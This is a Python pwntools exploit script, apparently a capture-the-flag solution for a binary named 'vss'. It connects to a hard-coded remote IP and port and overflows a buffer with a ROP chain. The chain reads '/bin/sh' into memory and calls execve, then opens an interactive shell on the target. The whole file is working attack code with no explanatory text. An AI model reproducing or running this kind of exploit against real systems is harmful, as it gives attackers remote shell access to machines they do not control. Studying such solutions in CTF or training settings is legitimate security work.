from pwn import *

#p = process('./vss')
p = remote('121.40.56.102', 2333)
p.recvuntil('Password:\n')

pop_rdx_rsi_ret = 0x43ae29
pop_rax_ret = 0x0046f443
pop_rdi_ret = 0x0046fb00
syscall_ret = 0x00462925
add_rsp_ret = 0x0046f2f1

#payload = p64(0x42424242424242) # fd
#payload += p64(pop_rdx_rsi_ret)
#payload += p64(0x10) # len
#payload += p64(0x6c6000) # addr
#payload += p64(syscall_ret)

#payload = payload.ljust(72, 'A')
binsh = '/bin/sh\x00'

payload = 'py' + 'B' * 70
payload += p64(add_rsp_ret)
payload += 'A' * 0x10
payload += 'B' * 0x8
payload += 'C' * 0x8
payload += 'D' * 0x8
payload += p64(pop_rax_ret)
payload += p64(0) 
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rdx_rsi_ret)
payload += p64(len(binsh)) # len
payload += p64(0x6c6000) # addr
payload += p64(syscall_ret) 
payload += p64(pop_rax_ret)
payload += p64(59)
payload += p64(pop_rdi_ret)
payload += p64(0x6c6000)
payload += p64(pop_rdx_rsi_ret)
payload += p64(0) * 2
payload += p64(syscall_ret)

payload = payload.ljust(1024, '\x00')
#payload += p64(0x4343434343434343)
#payload += p64(0x41414141) #p64(pop_rdi_ret)

#gdb.attach(p)

p.send(payload)
p.send(binsh)

p.interactive()
